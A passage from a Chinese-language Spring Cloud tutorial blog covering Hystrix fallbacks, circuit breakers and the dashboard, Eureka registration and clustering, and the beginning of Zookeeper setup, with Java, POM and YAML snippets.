&lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml 123456789server: port: 80eureka: client: register-with-eureka: false service-url: # defaultZone: http://localhost:7001/eureka/ defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ service接口，调用cloud-provider-hystrix-payment8001里的方法 12345678910111213141516171819202122package com.kayleh.springcloud.service;import org.springframework.cloud.openfeign.FeignClient;import org.springframework.stereotype.Component;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;/** * @Author: Wizard * @Date: 2020/8/7 20:54 */@Component@FeignClient(\"CLOUD-PROVIDER-HYSTRIX-PAYMENT\")public interface PaymentHystrixService &#123; @GetMapping(value = \"/payment/hystrix/ok/&#123;id&#125;\") public String paymentInfo_OK(@PathVariable(\"id\") Integer id); @GetMapping(value = \"/payment/hystrix/timeout/&#123;id&#125;\") public String paymentInfo_TimeOut(@PathVariable(\"id\") Integer id);&#125; controller 12345678910111213141516171819package com.kayleh.springcloud.controller;@RestController@Slf4jpublic class OrderHystrixController &#123; @Resource private PaymentHystrixService paymentFeignService; @GetMapping(value = \"/payment/hystrix/ok/&#123;id&#125;\") public String paymentInfo_OK(@PathVariable(\"id\") Integer id) &#123; return paymentFeignService.paymentInfo_OK(id); &#125; @GetMapping(value = \"/payment/hystrix/timeout/&#123;id&#125;\") public String paymentInfo_TimeOut(@PathVariable(\"id\") Integer id) &#123; return paymentFeignService.paymentInfo_TimeOut(id); &#125;&#125; 测试 1http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;hystrix&#x2F;ok&#x2F;1 导致原因 解决超时导致服务器变慢（转圈） 超时不在等待 出错（宕机或程序运行出错） 出错要有兜底 方法： 对方服务（8001）超时了，调用者（80）不能一直卡死等待，必须有服务降级 对方服务（8001）宕机了，调用者（80）不能一直卡死等待，必须有服务降级 对方服务（8001）OK，调用者（80）自己出故障或有自我要求（自己的等待时间小于服务提供者），自己处理降级 服务降级 服务器忙,请稍后再试,不让客户端等待并立刻返回一个友好提示,fallback 哪些情况会触发降级 程序运行异常 超时 服务熔断触发服务降级 线程池/信号量打满也会导致服务降级 降级配置 @HystrixCommand 从Hystrix-8001找问题，设置自身调用超时时间的峰值，峰值内可以正常运行，超过了需要有兜底的方法处理，作服务降级fallback 修改8001的Service 1234567891011121314151617181920212223242526272829303132package com.kayleh.springcloud.service;@Servicepublic class PaymentService &#123; /** * 正常访问 */ public String paymentInfo_OK(Integer id) &#123; return \"线程池: \" + Thread.currentThread().getName() + \" paymentInfo_OK,id: \" + id + \"\\t\" + \"O(∩_∩)O哈哈~\"; &#125; /** * 超时访问，演示降级 */ @HystrixCommand(fallbackMethod = \"paymentInfo_TimeOutHandler\", commandProperties = &#123; @HystrixProperty(name = \"execution.isolation.thread.timeoutInMilliseconds\", value = \"3000\") &#125;) public String paymentInfo_TimeOut(Integer id) &#123; //暂停3秒钟 int timeNumber = 5; try &#123; TimeUnit.SECONDS.sleep(timeNumber); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; return \"线程池: \" + Thread.currentThread().getName() + \" paymentInfo_TimeOut,id: \" + id + \"\\t\" + \"o(╥﹏╥)o哭\" + \"耗时\" + timeNumber + \"秒钟\"; &#125; public String paymentInfo_TimeOutHandler(Integer id) &#123; return \"调用支付接口超时或异常:\\t\" + \"\\t当前线程池名字\" + Thread.currentThread().getName(); &#125;&#125; 一旦调用服务方法失败后并抛出错误信息后，会自动调用@HystrixCommand标注好的fallbackMethod调用类中指定的方法。 1@HystrixProperty(name = \"execution.isolation.thread.timeoutInMilliseconds\", value = \"3000\" 这行代码表示3秒以内都是正常的逻辑。 修改8001的主启动类,开启降级 12345678@SpringBootApplication@EnableEurekaClient@EnableCircuitBreakerpublic class PaymentHystrixMain8001 &#123; public static void main(String[] args) &#123; SpringApplication.run(PaymentHystrixMain8001.class, args); &#125;&#125; 测试： 1http://localhost:8001/payment/hystrix/timeout/1 注释超时异常,制造 10/0 的异常也会降级. 当前服务不可用了,做服务降级,兜底的方案都是paymentInfo_TimeOutHandler. 让支付模块也支持Hystrix 修改cloud-consumer-feign-hystrix-order80的yaml: 添加 123feign: hystrix: enabled: true 修改启动类 12345678@SpringBootApplication@EnableFeignClients@EnableHystrixpublic class OrderHystrixMain80 &#123; public static void main(String[] args) &#123; SpringApplication.run(OrderHystrixMain80.class, args); &#125;&#125; 修改Controller(客户端的等待是1.5秒) 1234567891011121314151617181920212223242526package com.kayleh.springcloud.controller;@RestController@Slf4jpublic class OrderHystrixController &#123; @Resource private PaymentHystrixService paymentFeignService; @GetMapping(value = \"/consumer/payment/hystrix/ok/&#123;id&#125;\") public String paymentInfo_OK(@PathVariable(\"id\") Integer id) &#123; return paymentFeignService.paymentInfo_OK(id); &#125; @GetMapping(value = \"/consumer/payment/hystrix/timeout/&#123;id&#125;\") @HystrixCommand(fallbackMethod = \"paymentInfo_TimeOutHandler\", commandProperties = &#123; @HystrixProperty(name = \"execution.isolation.thread.timeoutInMilliseconds\", value = \"1500\") &#125;) public String paymentInfo_TimeOut(@PathVariable(\"id\") Integer id) &#123; return paymentFeignService.paymentInfo_TimeOut(id); &#125; public String paymentTimeOutFallbackMethod(Integer id) &#123; return \"我是消费者80，对方支付系统繁忙请10秒钟后再试试或者自己运行出错请检查自己，o(╥﹏╥)o\"; &#125;&#125; 测试: 1http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;hystrix&#x2F;timeout&#x2F;1 如果修改paymentInfo_TimeOut超时错误为10/0,也会进入paymentTimeOutFallbackMethod 全局服务降级目前问题: 每个业务方法对应一个兜底的方法,代码膨胀 统一和自定义的分开 解决问题:@DefaultProperties(defaultFallback = “”) 修改cloud-consumer-feign-hystrix-order80的OrderHystrixController： 添加：@DefaultProperties(defaultFallback = “payment_Global_FallbackMethod”) ​ 和方法payment_Global_FallbackMethod 123456789101112131415161718192021222324252627282930313233package com.kayleh.springcloud.controller;@RestController@Slf4j@DefaultProperties(defaultFallback = \"payment_Global_FallbackMethod\")public class OrderHystrixController &#123; @Resource private PaymentHystrixService paymentFeignService; @GetMapping(value = \"/consumer/payment/hystrix/ok/&#123;id&#125;\") public String paymentInfo_OK(@PathVariable(\"id\") Integer id) &#123; return paymentFeignService.paymentInfo_OK(id); &#125; @GetMapping(value = \"/consumer/payment/hystrix/timeout/&#123;id&#125;\")// @HystrixCommand(fallbackMethod = \"paymentTimeOutFallbackMethod\", commandProperties = &#123;// @HystrixProperty(name = \"execution.isolation.thread.timeoutInMilliseconds\", value = \"1500\")// &#125;) @HystrixCommand public String paymentInfo_TimeOut(@PathVariable(\"id\") Integer id) &#123; return paymentFeignService.paymentInfo_TimeOut(id); &#125; public String paymentTimeOutFallbackMethod(Integer id) &#123; return \"我是消费者80，对方支付系统繁忙请10秒钟后再试试或者自己运行出错请检查自己，o(╥﹏╥)o\"; &#125; //全局fallback方法 public String payment_Global_FallbackMethod() &#123; return \"Global异常处理信息,请稍后再试,(⊙o⊙)…\"; &#125;&#125; 再测试 123http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;hystrix&#x2F;timeout&#x2F;1---------------------Global异常处理信息,请稍后再试,(⊙o⊙)… 通配服务降级FeignFallback 修改cloud-consumer-feign-hystrix-order80，根据cloud-consumer-feign-hystrix-order80已经有的PaymentHystrixService接口，重新新建一个类(PaymentFallbackService)实现该接口，统一为接口里的方法进行异常处理。 访问异常就访问实现类下的方法。 新建实现类 123456789101112131415161718package com.kayleh.springcloud.service;/** * @Author: Wizard * @Date: 2020/8/8 22:54 */@Componentpublic class PaymentFallbackService implements PaymentHystrixService &#123; @Override public String paymentInfo_OK(Integer id) &#123; return \"----------PaymentFallbackService fall back,o(╥﹏╥)o\\tpaymentInfo_OK\"; &#125; @Override public String paymentInfo_TimeOut(Integer id) &#123; return \"----------PaymentFallbackService fall back,o(╥﹏╥)o\\tpaymentInfo_TimeOut\"; &#125;&#125; yml:添加 123feign: hystrix: enabled: true 接口修改注解： @FeignClient(value = “CLOUD-PROVIDER-HYSTRIX-PAYMENT”, fallback = PaymentFallbackService.class) 12345678910111213141516package com.kayleh.springcloud.service;/** * @Author: Wizard * @Date: 2020/8/7 20:54 */@Component@FeignClient(value = \"CLOUD-PROVIDER-HYSTRIX-PAYMENT\", fallback = PaymentFallbackService.class)public interface PaymentHystrixService &#123; @GetMapping(value = \"/payment/hystrix/ok/&#123;id&#125;\") public String paymentInfo_OK(@PathVariable(\"id\") Integer id); @GetMapping(value = \"/payment/hystrix/timeout/&#123;id&#125;\") public String paymentInfo_TimeOut(@PathVariable(\"id\") Integer id);&#125; 测试： 123http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;hystrix&#x2F;ok&#x2F;1 -正常访问关掉微服务8001再访问http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;hystrix&#x2F;ok&#x2F;1 -fallback 此时服务端provider已经宕机，但是我们做了服务降级处理，让客户端在服务端不可用时也会获得提示信息而不会挂起耗死服务器。 服务熔断 类比保险丝达到最大服务器访问后,直接拒绝访问,拉闸限电,然后调用服务降级的方法并返回友好提示,break 保险丝. 服务降级—&gt;进而熔断—&gt;恢复调用链路 熔断机制概述熔断机制是应对雪崩效应的一种微服务链路保护机制。当扇出链路的某个微服务出错不可用或者响应时间太长时，会进行服务的降级，进而熔断该节点微服务的调用，快速返回错误的响应信息。 当检测到该节点微服务调用响应正常后，恢复调用链路。 在SpringCloud框架里，熔断机制通过hystrix实现。hystrix会监视微服务间调用的状况， 当失败的调用到一定阈值，缺省是5秒内20次调用失败，就会启动熔断机制。熔断机制的注解是@HystrixCommand. 案例：修改PaymentHystrixMain8001 修改PaymentService , 添加 1234567891011121314151617181920212223/** * 服务熔断 */ @HystrixCommand(fallbackMethod = \"paymentCircuitBreaker_fallback\", commandProperties = &#123;@HystrixProperty(name = \"circuitBreaker.enabled\", value = \"true\"),//是否开启断路器@HystrixProperty(name = \"circuitBreaker.requestVolumeThreshold\", value = \"10\"),//请求次数@HystrixProperty(name = \"circuitBreaker.sleepWindowInMilliseconds\", value=\"10000\"),//时间窗口期@HystrixProperty(name = \"circuitBreaker.errorThresholdPercentage\", value = \"60\"),//失败率达到多少后跳闸 &#125;) public String paymentCircuitBreaker(@PathVariable(\"id\") Integer id) &#123; if (id &lt; 0) &#123; throw new RuntimeException(\"******id 不能为负数\"); &#125; String serialNumber = IdUtil.simpleUUID(); return Thread.currentThread().getName() + \"\\t\" + \"调用成功,流水号:\" + serialNumber; &#125; public String paymentCircuitBreaker_fallback(@PathVariable(\"id\") Integer id) &#123; return \"id 不能负数，请稍后再试，o(╥﹏╥)o id:\" + id; &#125; PaymentController,添加 1234567// -----服务熔断 @GetMapping(\"/payment/circuit/&#123;id&#125;\") public String paymentCircuitBreaker(@PathVariable(\"id\") Integer id) &#123; String result = paymentService.paymentCircuitBreaker(id); log.info(\"****result:\" + result); return result; &#125; 测试 12http:&#x2F;&#x2F;localhost:8001&#x2F;payment&#x2F;circuit&#x2F;1http:&#x2F;&#x2F;localhost:8001&#x2F;payment&#x2F;circuit&#x2F;-1 熔断类型 熔断打开 请求不再进行调用当前服务,内部设置时钟一般为MTTR(平均故障处理时间),当打开时长达到所设时钟则进入半熔断状态. 熔断关闭 熔断关闭不会对服务进行熔断 熔断半开 部分请求根据规则调用当前服务,如果请求成功且符合规则则认为当前服务恢复正常,关闭熔断. 断路器在什么情况下开始起作用: 断路器打开或关闭的条件: 断路器打开之后: Hystrix图形化DashBoard 新建cloud-consumer-hystrix-dashboard9001 pom.xml 123456789101112131415161718192021222324252627282930313233343536373839&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-netflix-hystrix-dashboard&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--引入自己定义的api通用包，可以使用Payment支付Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; yml 12server: port: 9001 主启动类 123456789101112/** * @Author: Wizard * @Date: 2020/8/3 18:10 */@SpringBootApplication@EnableHystrixDashboardpublic class HystrixDashboard9001 &#123; public static void main(String[] args) &#123; SpringApplication.run(HystrixDashboard9001.class, args); &#125;&#125; 修改cloud-provider-hystrix-payment8001的主启动类：添加 123456789101112131415161718192021222324252627/** * @Author: Wizard * @Date: 2020/8/3 18:10 */@SpringBootApplication@EnableEurekaClient@EnableCircuitBreakerpublic class PaymentHystrixMain8001 &#123; public static void main(String[] args) &#123; SpringApplication.run(PaymentHystrixMain8001.class, args); &#125; /** * 此配置是为了服务监控而配置，与服务容错本身无关，SpringCloud升级后的坑 * ServletRegistrationBean因为springboot的默认路径不是\"/hystrix.stream\" * 只要在自己的项目配置上下面的servlet就可以了 */ @Bean public ServletRegistrationBean getServlet() &#123; HystrixMetricsStreamServlet streamServlet = new HystrixMetricsStreamServlet(); ServletRegistrationBean registrationBean = new ServletRegistrationBean(streamServlet); registrationBean.setLoadOnStartup(1); registrationBean.addUrlMappings(\"/hystrix.stream\"); registrationBean.setName(\"HystrixMetricsStreamServlet\"); return registrationBean; &#125;&#125; 测试 1http:&#x2F;&#x2F;localhost:9001&#x2F;hystrix 配置9001监控8001 测试 12http:&#x2F;&#x2F;localhost:8001&#x2F;payment&#x2F;circuit&#x2F;1http:&#x2F;&#x2F;localhost:8001&#x2F;payment&#x2F;circuit&#x2F;-1 七色: 一圈: 一线: 整个图: 流程图：","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"Eureka服务注册与发现","slug":"分布式的微服务架构2","date":"2020-08-14T07:03:57.000Z","updated":"2021-04-11T17:11:28.661Z","comments":true,"path":"eureka-service-registration-and-discovery/","link":"","permalink":"https://kayleh.top/eureka-service-registration-and-discovery/","excerpt":"Eureka服务注册与发现","text":"Eureka服务注册与发现 服务治理Spring Cloud封装了Netflix公司开发的Eureka模块来实现服务治理。 在传统的rpc远程调用框架中，管理每个服务与服务之间依赖关系比较复杂，管理比较复杂，所以需要使用服务治理，管理服务于服务之间的依赖关系，可以实现服务调用、负载均衡、容错等，实现服务发现与注册。 服务注册与发现Eureka采用了CS的设计架构，Eureka Server作为服务注册功能的服务器，它是服务注册的中心。而系统中其他的微服务，使用了Eureka的客户端连接到Eureka Server并维持心跳连接。这样系统的维护人员就可以通过Eureka Server来监控系统中各个微服务是否正常运行。 在服务注册与发现中，有一个注册中心。当服务器启动的时候，会把当前自己服务器的信息 比如 服务地址通讯地址等以别名方式注册到注册中心上。另一方(消费者|服务提供者)，以该别名的方式去注册中心上获取到实际的服务通讯地址，然后再实现本地RPC调用RPC远程调用框架核心设计思想：在于注册中心上，因为使用注册中心管理每个服务与服务之间的一个依赖关系(服务治理概念).在任何rpc远程框架中,都会有一个注册中心(存放服务地址相关信息(接口地址)); ​ 左边是Eureka系统架构,右边是Dubbo的架构 Eureka包含两个组件:Eureka Server和Eureka Client Eureka Server提供服务注册服务 各个微服务节点通过配置启动,会在EurekaServer中进行注册,这样EurekaServer中的服务注册表中将会存储所有可用服务节点的信息,服务节点的信息可以在界面中直观看到. EurekaClient通过注册中心进行访问 是一个Java客户端,用于简化Eureka Server的交互,客户端同时也具备一个内置的、使用轮询(round-robin)负载算法的负载均衡器.在应用启动后,将会向Eureka Server发送心跳(默认周期为30秒)。如果Eureka Server在多个心跳周期内没有接受到某个节点的心跳，EurekaServer将会从服务注册表中把这个服务节点移除(默认90秒)。 服务端安装新建model:cloud-eureka-server7001 pom.xml 12345678910111213141516171819202122232425262728293031323334353637383940&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--引入自己定义的api通用包，可以使用Payment支付Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;!--boot web actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; applicaiton.yml 12345678910111213server: port: 7001eureka: instance: hostname: localhost # eureka服务端的实例名称 client: # false表示不向注册中心注册自己 register-with-eureka: false # false表示自己端就是注册中心,我的职责就是维护服务实例,并不需要去检索服务. fetch-registry: false service-url: # 设置与Eureka Server交互的地址查询服务和注册服务都需要依赖这个地址. defaultZone: http://$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka/ 主启动类 1234567891011121314151617package com.kayleh.springcloud;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;/** * @Author: Wizard * @Date: 2020/8/4 15:57 */@SpringBootApplication@EnableEurekaServerpublic class EurekaMain7001 &#123; public static void main(String[] args) &#123; SpringApplication.run(EurekaMain7001.class, args); &#125;&#125; 访问 http://localhost:7001 支付微服务8001入驻进EurekaServer 微服务8001的pom文件:添加坐标 12345&lt;!--eureka-client--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; application.yml下添加 123456789eureka: client: # 表示是否将自己注册进eurekaServer默认为true register-with-eureka: true # 表示从eurekaServer抓取已有的注册信息，默认为true。单节点无所谓，集群必须设置为true才能配合ribbon使用负载均衡 fetch-registry: true service-url: # 设置与Eureka Server交互的地址查询服务和注册服务都需要依赖这个地址. defaultZone: http://localhost:7001/eureka 主启动类添加client注解 1234567@SpringBootApplication@EnableEurekaClientpublic class PaymentMain8001 &#123; public static void main(String[] args) &#123; SpringApplication.run(PaymentMain8001.class, args); &#125;&#125; 微服务注册名配置说明 访问Eureka出现红字原因: 自我保护机制. 配置微服务80进驻Eureka; 改pom,添加坐标 改yml 12345678910111213141516server: port: 80spring: application: name: cloud-order-serviceeureka: client: # 表示是否将自己注册进eurekaServer默认为true register-with-eureka: true # 表示从eurekaServer抓取已有的注册信息，默认为true。单节点无所谓，集群必须设置为true才能配合ribbon使用负载均衡 fetch-registry: true service-url: # 设置与Eureka Server交互的地址查询服务和注册服务都需要依赖这个地址. defaultZone: http://localhost:7001/eureka 主启动类添加client注解. 集群eureka构建eureka集群原理分析 解决办法:搭建eureka注册中心集群,实现负载均衡+故障容错 构建集群(单机走向集群)新建model:cloud-eureka-server7002 复制微服务7001的pom.xml 修改C:\\Windows\\System32\\drivers\\etc目录下的hosts文件 添加进hosts文件 12127.0.0.1 eureka7001.com127.0.0.1 eureka7002.com 修改7001和7002的application.yml (如果是三台集群的话,在service-url下继续写,用逗号分隔开) 12345678910111213141516171819202122232425262728297001:server: port: 7001 eureka: instance: hostname: eureka7001.com #eureka服务端的实例名称 client: # false表示不向注册中心注册自己 register-with-eureka: false # false表示自己端就是注册中心,我的职责就是维护服务实例,并不需要去检索服务. fetch-registry: false service-url: defaultZone: http://eureka7002.com:7002/eureka/--------------------------------------------------------7002:server: port: 7002 eureka: instance: hostname: eureka7002.com #eureka服务端的实例名称 client: # false表示不向注册中心注册自己 register-with-eureka: false # false表示自己端就是注册中心,我的职责就是维护服务实例,并不需要去检索服务. fetch-registry: false service-url: defaultZone: http://eureka7001.com:7001/eureka/ 7002启动类加注解 访问 12eureka7001.com:7001eureka7002.com:7002 将80和8001模块注册进eureka, 修改yaml文件 1defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ 测试 1http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;get&#x2F;1 支付服务提供者8001集群环境构建新建cloud-provider-payment8002 pom.xml和8001一致 copy 8001的yml文件到8002,修改端口号 12server: port: 8002 主启动类,业务类 直接cpoy8001 修改8001和8002的controller 1234567添加@Value(\"$&#123;server.port&#125;\")private String serverPort;修改打印\"插入数据库成功,serverPort\" + serverPort\"查询成功,serverPort:\" + serverPort 负载均衡修改消费者80模块的OrderController的订单服务访问地址 1public static final String PAYMENT_URL = \"http://CLOUD-PAYMENT-SERVICE\"; 修改ApplicationContextConfig 123456789@Configurationpublic class ApplicationContextConfig &#123; @Bean @LoadBalanced public RestTemplate getRestTemplate() &#123; return new RestTemplate(); &#125;&#125;添加@LoadBalanced开启RestTemplate的负载均衡 测试 1http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;get&#x2F;1 可以看到8001端口和8002端口交替出现. Ribbon和Eureka整合后,Consumer可以直接调用服务而不用关心地址和端口号,且该服务还有负载功能. axtuator微服务信息完善当前问题 暴露主机名 修改cloud-provider-payment8001和8002 的yml 12345678910111213eureka: client: # 表示是否将自己注册进eurekaServer默认为true register-with-eureka: true # 表示从eurekaServer抓取已有的注册信息，默认为true。单节点无所 fetch-registry: true service-url: # 设置与Eureka Server交互的地址查询服务和注册服务都需要依赖这个地址. # defaultZone: http://localhost:7001/eureka/ defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ instance: instance-id: payment8001添加instance配置 更改之后 点开链接,测试 1http:&#x2F;&#x2F;wizard:8002&#x2F;actuator&#x2F;health 访问地址显示ip地址 修改8001,8002的yml,添加 123instance: instance-id: payment8001 prefer-ip-address: true 服务发现Discovery对于注册进eureka里面的微服务,可以通过服务发现来获得该服务的信息. 修改8001的controller 12345678910111213141516添加@Resourceprivate DiscoveryClient discoveryClient;@GetMapping(value = \"/payment/discovery\")public Object discovery() &#123; List&lt;String&gt; services = discoveryClient.getServices(); for (String element : services) &#123; log.info(\"----------element:\" + element); &#125; List&lt;ServiceInstance&gt; instances = discoveryClient.getInstances(\"CLOUD-PAYMENT-SERVICE\"); for (ServiceInstance instance : instances) &#123; log.info(instance.getServiceId() + \"\\t\" + instance.getHost() + \"\\t\" + instance.getPort() + \"\\t\" + instance.getUri()); &#125; return this.discoveryClient; &#125; 启动类添加注解 12345678@SpringBootApplication@EnableEurekaClient@EnableDiscoveryClientpublic class PaymentMain8001 &#123; public static void main(String[] args) &#123; SpringApplication.run(PaymentMain8001.class, args); &#125;&#125; 测试 123http:&#x2F;&#x2F;localhost:8001&#x2F;payment&#x2F;discovery------------------------------------------&#123;&quot;services&quot;:[&quot;cloud-order-service&quot;,&quot;cloud-payment-service&quot;],&quot;order&quot;:0&#125; Eureka的自我保护机制故障现象: 导致原因: 某时刻某一个微服务不可用了,Eureka不会立刻清理,依旧会对该微服务的信息进行保存. 属于CAP里面的AP分支 关闭自我保护 修改7001的yaml 1234567891011121314151617添加 server: enable-self-preservation: false---------------------------------------eureka: instance: hostname: eureka7001.com client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://eureka7002.com:7002/eureka/ server: #关闭自我保护机制，保证不可用服务被及时删除 enable-self-preservation: false #时间间隔 eviction-interval-timer-in-ms: 2000 8001的yml加入 1234567instance: instance-id: payment8001 prefer-ip-address: true # eureka客户端向服务端发送心跳的时间间隔，单位为秒（默认是30秒） lease-expiration-duration-in-seconds: 1 # eureka服务端在收到最后一次心跳后等待时间上限，单位为秒（默认是90秒），超时将剔除服务 lease-renewal-interval-in-seconds: 2 Zookepper需要Linux安装Zookepper 新建工程cloud-provider-payment8004 pom.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;dependencies&gt; &lt;!-- Zookeeper客户端--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-zookeeper-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--引入自己定义的api通用包，可以使用Payment支付Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 热部署--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; application.yml 1234567891011server: port: 8004#服务别名spring: application: name: cloud-provider-payment cloud: zookeeper: # zookeeper的机器ip加端口号 connect-string: 192.168.111.144:2181 启动类 1234567891011121314151617package com.kayleh.springcloud;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;/** * @Author: Wizard * @Date: 2020/8/5 16:58 */@SpringBootApplication@EnableDiscoveryClientpublic class PaymentMain8004 &#123; public static void main(String[] args) &#123; SpringApplication.run(PaymentMain8004.class, args); &#125;&#125; PaymentController 123456789101112131415161718192021222324package com.kayleh.springcloud.controller;import lombok.extern.slf4j.Slf4j;import org.springframework.beans.factory.annotation.Value;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.UUID;/** * @Author: Wizard * @Date: 2020/8/5 17:00 */@RestController@Slf4jpublic class PaymentController &#123; @Value(\"$&#123;server.port&#125;\") private String serverPort; @RequestMapping(value = \"/payment/zk\") public String paymentzk() &#123; return \"Springcloud with zookeeper:\" + serverPort + \"\\t\" + UUID.randomUUID().toString(); &#125;&#125; jar包冲突 123456789101112131415161718&lt;!-- Zookeeper客户端--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; 